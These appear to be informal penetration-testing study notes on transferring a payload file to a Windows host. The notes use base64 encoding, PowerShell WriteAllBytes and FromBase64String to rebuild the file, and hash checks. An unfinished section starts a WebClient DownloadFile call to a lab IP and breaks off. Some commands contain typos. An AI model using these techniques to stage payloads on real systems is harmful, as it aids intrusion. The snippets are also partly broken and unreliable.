OK lets get started

- [x] COPY AND PASTE METHOD 
1. B64 ENCODE YOUR PAYLOAD
```bash
cat "payload.txt" | base64 -w 0;echo
```
The `-w` disables line wrapping, 0 means off, default is 76. This makes sure the string is one continuous line 
2. INSIDE windos pwsh 
```
[IO.FILE]::WriteAllBytes("C:\\Desktop\\paylaod.txt", 
[Convert]::FromBase64String("SAhsdigbghcjeowgf=="))
```
`[IO.FILE]::WriteAllBytes("path", bytes` coverts the base64 payload into a bytes array 
then we convert they `bytes` from base64 using the `[Convert]::FromBase64String("b64 string")`

The `Get-FileHash` cmdlet can be used to compare the file hashed to make sure the payloads are the same
```
Get-FileHash C:\\Desktop\payload.txt -Algorithm md5
```
In linux the `md5sum` utility slaps too 
```
md5sum payload.txt
```

- [ ] POWERSHELL DOWNLOADFILE METHOD
Class name `Net.WebClient` and the `DownlaodFile` method 
- FILE DOWNLOAD 
```powershell
(New-Object New.WebClient).DownloadFile('http://10.10.10.15:)
```